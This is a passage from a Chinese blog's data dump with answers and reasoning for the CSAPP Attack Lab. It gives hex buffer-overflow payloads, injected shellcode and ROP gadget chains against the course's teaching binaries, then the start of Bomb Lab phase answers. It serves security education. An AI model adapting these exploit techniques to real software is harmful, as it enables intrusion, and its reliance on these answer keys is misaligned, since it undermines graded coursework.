r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？） 之后用多个mov，实现rsp mov到rax再mov到rdi 然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi 接着就是touch3的地址，让mov rax rdi下面那条ret直接跳转到touch3，攻击成功 几个注意点 用vim的16进制编辑模式要加在打开vim时加-b，否则，会把诸如c0这一类大于0x3f的不属于ascii范围的字符修改成3f ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节 指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址 ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置 注意gets遇到编码为0xFF的字符时不会终止读取","raw":"---\ntitle: CSAPP Attack Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-16 13:18:56\ntags:\n- CSAPP Lab\ndescription: CSAPP 攻击实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP Attack Lab\n\n> 本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符\n\n### 第一题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\n/* this five lines fill the buf */\n\nc0 17 40 00\t00 00 00 00 \n/* touch1's addr */\n```\n\n#### 思路\n\n- 不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上`touch1`的地址（直接用十六进制写），然后用`hex2raw`转换后输入即可AC\n\n### 第二题\n\n#### 答案\n\n```c\nec 17 40 00 00 00 00 00 \n/* touch2的地址 */\n\n48 83 ec 30\n/* sub  $0x30, %rsp */\n\n48 c7 c7 fa 97 b9 59 \n/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/\n\nc3 /* retq */\n\naa aa aa aa aa aa aa aa\naa aa aa aa  aa aa aa aa \naa aa aa aa \n/* 填充的字符串 */\n\n80 dc 61 55\n/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */\n```\n\n#### 思路\n\n- 需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置\n- 需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址\n\n### 第三题\n\n#### 答案\n\n```c\nfa 18 40 00 00 00 00 00 \n/* touch3 addr, in 0x5561dc78 */\n\n48 83 ec 30 \n/* sub $0x30,%rsp, in 0x5561dc80 */\n\n48 c7 c7 90 dc 61 55 \n/* mov  $0x5561dc90,%rdi */\n\nc3 \n/* retq will ret to 0x5561dc78 */   \n\n00 00 00 00 \n/*fill the extra space */\n\n35 39 62 39 39 37 66 61\t00\t\n/* string \"59b997fa\" ，in 0x5561dc90 */\n\naa aa aa aa aa aa aa \n/* fill the extra space */ \n\n80 dc 61 55 00 00 00 00 \n/* 0x5561dc80, our code's begin addr */\n\n/* \n* just before our attack code is run, \n* rsp == 0x5561dca0 \n* return addr in 0x5561dca0\n*/\n```\n\n#### 思路\n\n- 比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串\n- 然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80\n- 接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶\n\n### 第四题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa\n/* this five line fill the buf */\n\ncc 19 40 00 00 00 00 00\t\n/* 0x4019cc\t pop %rax; nop; ret */\n\nfa 97 b9 59 00 00 00 00\t\n/* 0x59b997fa */\n\na2 19 40 00 00 00 00 00\t\n/* 0x4019a2\t movq %rax, %rdi; ret */\n\nec 17 40 00 00 00 00 00\t\n/* touch2 0x4017ec */\n```\n\n\n\n#### 思路\n\n- 构造rop链，在0x4019ca处有`  b8 29 58 90 c3 mov $0xc3905829,%eax`，观察字节码，在0x4019cc处的`58`是`pop rax`，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax\n- 在0x4019a0有`8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax`，观察字节码，0x4019a2处有`48 89 c7`，也就是`mov %rax, %rdi`，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了\n\n### 第五题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\t\t\n/* this five lines fill space of buf */\n\n17 2b 40 00 00 00 00 00\t \t\n/* 402b17, pop rsi,ret to this, assume that rsp is K */\n\n20 00 00 00 00 00 00 00\t\n/* the data pop to rsi */\n\n00 00 00 00 00 00 00 00\t\n/* the data are pop to r15 */\n/* after all pop, rsp is K+16 */\n\n06 1a 40 00 00 00 00 00\t\t\n/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */\n\na2 19 40 00 00 00 00 00\t\t\n/* 4019a2, movq rax, rdi */\n\nd6 19 40 00 00 00 00 00\t\t\n/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */\n\nc5 19 40 00 00 00 00 00\t\t\n/* 4019c5, mov rax, rdi */\n\nfa 18 40 00 00 00 00 00\t\t\n/* 4018fa touch3 */\n\n35 39 62 39 39 37 66 61\t00 00 00 00 00 00 00 00\t\n/* 0x59b997fa in here */\n```\n\n#### 思路\n\n- 把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后\n\n- 用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的`lea (%rdi,%rsi,1),%rax`符合要求\n\n- 为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到`pop %r14`，该指令第二个字节`5e`是`pop %rsi`，因为该指令跟ret之间还有`pop %r15`，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。\n\n  > r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）\n\n- 之后用多个mov，实现rsp mov到rax再mov到rdi\n\n- 然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi\n\n- 接着就是touch3的地址，让`mov rax rdi`下面那条ret直接跳转到touch3，攻击成功\n\n### 几个注意点\n\n- 用vim的16进制编辑模式要加在打开vim时加`-b`，否则，会把诸如`c0`这一类大于`0x3f`的不属于ascii范围的字符修改成`3f`\n\n\n- ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节\n- 指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址\n- ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置\n- 注意gets遇到编码为0xFF的字符时不会终止读取\n\n","content":"<h1 id=\"CSAPP-Attack-Lab\"><a href=\"#CSAPP-Attack-Lab\" class=\"headerlink\" title=\"CSAPP Attack Lab\"></a>CSAPP Attack Lab</h1><blockquote>\n<p>本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符</p>\n</blockquote>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><h4 id=\"答案\"><a href=\"#答案\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\"><span class=\"comment\">/* this five lines fill the buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c0 <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span>\t<span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch1's addr */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上<code>touch1</code>的地址（直接用十六进制写），然后用<code>hex2raw</code>转换后输入即可AC</li>\n</ul>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><h4 id=\"答案-1\"><a href=\"#答案-1\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ec <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch2的地址 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">83</span> ec <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"comment\">/* sub  $0x30, %rsp */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> c7 c7 fa <span class=\"number\">97</span> b9 <span class=\"number\">59</span> </span><br><span class=\"line\"><span class=\"comment\">/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">c3 <span class=\"comment\">/* retq */</span></span><br><span class=\"line\"></span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa  aa aa aa aa </span><br><span class=\"line\">aa aa aa aa </span><br><span class=\"line\"><span class=\"comment\">/* 填充的字符串 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">80</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span></span><br><span class=\"line\"><span class=\"comment\">/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置</li>\n<li>需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址</li>\n</ul>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><h4 id=\"答案-2\"><a href=\"#答案-2\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fa <span class=\"number\">18</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch3 addr, in 0x5561dc78 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">83</span> ec <span class=\"number\">30</span> </span><br><span class=\"line\"><span class=\"comment\">/* sub $0x30,%rsp, in 0x5561dc80 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> c7 c7 <span class=\"number\">90</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span> </span><br><span class=\"line\"><span class=\"comment\">/* mov  $0x5561dc90,%rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c3 </span><br><span class=\"line\"><span class=\"comment\">/* retq will ret to 0x5561dc78 */</span>   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/*fill the extra space */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">35</span> <span class=\"number\">39</span> <span class=\"number\">62</span> <span class=\"number\">39</span> <span class=\"number\">39</span> <span class=\"number\">37</span> <span class=\"number\">66</span> <span class=\"number\">61</span>\t<span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* string \"59b997fa\" ，in 0x5561dc90 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">aa aa aa aa aa aa aa </span><br><span class=\"line\"><span class=\"comment\">/* fill the extra space */</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">80</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* 0x5561dc80, our code's begin addr */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">* just before our attack code is run, </span></span><br><span class=\"line\"><span class=\"comment\">* rsp == 0x5561dca0 </span></span><br><span class=\"line\"><span class=\"comment\">* return addr in 0x5561dca0</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串</li>\n<li>然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80</li>\n<li>接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶</li>\n</ul>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><h4 id=\"答案-3\"><a href=\"#答案-3\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\"><span class=\"comment\">/* this five line fill the buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\">cc <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x4019cc\t pop %rax; nop; ret */</span></span><br><span class=\"line\"></span><br><span class=\"line\">fa <span class=\"number\">97</span> b9 <span class=\"number\">59</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x59b997fa */</span></span><br><span class=\"line\"></span><br><span class=\"line\">a2 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x4019a2\t movq %rax, %rdi; ret */</span></span><br><span class=\"line\"></span><br><span class=\"line\">ec <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* touch2 0x4017ec */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>构造rop链，在0x4019ca处有<code>b8 29 58 90 c3 mov $0xc3905829,%eax</code>，观察字节码，在0x4019cc处的<code>58</code>是<code>pop rax</code>，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax</li>\n<li>在0x4019a0有<code>8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax</code>，观察字节码，0x4019a2处有<code>48 89 c7</code>，也就是<code>mov %rax, %rdi</code>，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了</li>\n</ul>\n<h3 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h3><h4 id=\"答案-4\"><a href=\"#答案-4\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa\t\t</span><br><span class=\"line\"><span class=\"comment\">/* this five lines fill space of buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">17</span> <span class=\"number\">2b</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t \t</span><br><span class=\"line\"><span class=\"comment\">/* 402b17, pop rsi,ret to this, assume that rsp is K */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">20</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* the data pop to rsi */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* the data are pop to r15 */</span></span><br><span class=\"line\"><span class=\"comment\">/* after all pop, rsp is K+16 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">06</span> <span class=\"number\">1</span>a <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">a2 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019a2, movq rax, rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">d6 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c5 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019c5, mov rax, rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">fa <span class=\"number\">18</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4018fa touch3 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">35</span> <span class=\"number\">39</span> <span class=\"number\">62</span> <span class=\"number\">39</span> <span class=\"number\">39</span> <span class=\"number\">37</span> <span class=\"number\">66</span> <span class=\"number\">61</span>\t<span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x59b997fa in here */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后</p>\n</li>\n<li><p>用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的<code>lea (%rdi,%rsi,1),%rax</code>符合要求</p>\n</li>\n<li><p>为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到<code>pop %r14</code>，该指令第二个字节<code>5e</code>是<code>pop %rsi</code>，因为该指令跟ret之间还有<code>pop %r15</code>，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。</p>\n<blockquote>\n<p>r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）</p>\n</blockquote>\n</li>\n<li><p>之后用多个mov，实现rsp mov到rax再mov到rdi</p>\n</li>\n<li><p>然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi</p>\n</li>\n<li><p>接着就是touch3的地址，让<code>mov rax rdi</code>下面那条ret直接跳转到touch3，攻击成功</p>\n</li>\n</ul>\n<h3 id=\"几个注意点\"><a href=\"#几个注意点\" class=\"headerlink\" title=\"几个注意点\"></a>几个注意点</h3><ul>\n<li>用vim的16进制编辑模式要加在打开vim时加<code>-b</code>，否则，会把诸如<code>c0</code>这一类大于<code>0x3f</code>的不属于ascii范围的字符修改成<code>3f</code></li>\n</ul>\n<ul>\n<li>ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节</li>\n<li>指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址</li>\n<li>ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置</li>\n<li>注意gets遇到编码为0xFF的字符时不会终止读取</li>\n</ul>\n","slug":"CSAPP-Attack-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"CSAPP Bomb Lab","date":"2017-09-14T18:04:11.000Z","path":"2017/09/15/CSAPP-Bomb-Lab/","text":"CSAPP Bomb Lab答案 Border relations with Canada have never been better. 1 2 4 8 16 32 多个答案 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 应该有多个答案 7 0 一个6个字符的字符串，字符串的ascii值依次为 $9+k\\times16$ $15+k\\times16$ $14+k\\times16$ $5+k\\times16$ $6+k\\times16$ $7+k\\times16$ ​ 4 3 2 1 6 5 第一题解答思路 string_not_equal函数比对(0x402400)位置的string与输入的string 直接运行gdb，print (char*)0x402400即可 不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333 第二题解答思路 汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入1 2 4 8 16 32即可AC 第三题解题思路 12345lea 0xc(%rsp),%rcx //rcx=12+rsplea 0x8(%rsp),%rdx //rdx=8+rspmov $0x4025cf,%esi //%d %dmov $0x0,%eaxcallq 400bf0 &lt;__isoc99_sscanf@plt&gt; 从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdbprint (char*)0x4025cf打印出&quot;%d %d&quot; 然后测试读入的第一个数字是否大于7，如果是，explode_bomb 然后就是一个switch，用gdbx/14w 0x402470打印出 12340x402470: 0x00400f7c 0x00000000 0x00400fb9 0x000000000x402480: 0x00400f83 0x00000000 0x00400f8a 0x000000000x402490: 0x00400f91 0x00000000 0x00400f98 0x000000000x4024a0: 0x00400f9f 0x00000000 按照对应关系确定第二个读入的数字即可 第四题解题思路 同样是用sscanf读入两个数字 由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果 第五题解题思路 12callq 40131b &lt;string_length&gt;cmp $0x6,%eax 读入6个字符的字符串 123456movzbl (%rbx,%rax,1),%ecxmov %cl,(%rsp)mov (%rsp),%rdxand $0xf,%edxmovzbl 0x4024b0(%rdx),%edxmov %dl,0x10(%rsp,%rax,1) 提取每个字符的ascii的低4bits，放在edx里，然后从0x4024b0+edx的位置读入数据放在栈上 123mov $0x40245e,%esilea 0x10(%rsp),%rdicallq 401338 &lt;strings_not_equal&gt; 后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。 用gdb分别打印0x4024b0 0x40245e处的字符串，获得 maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? flyers 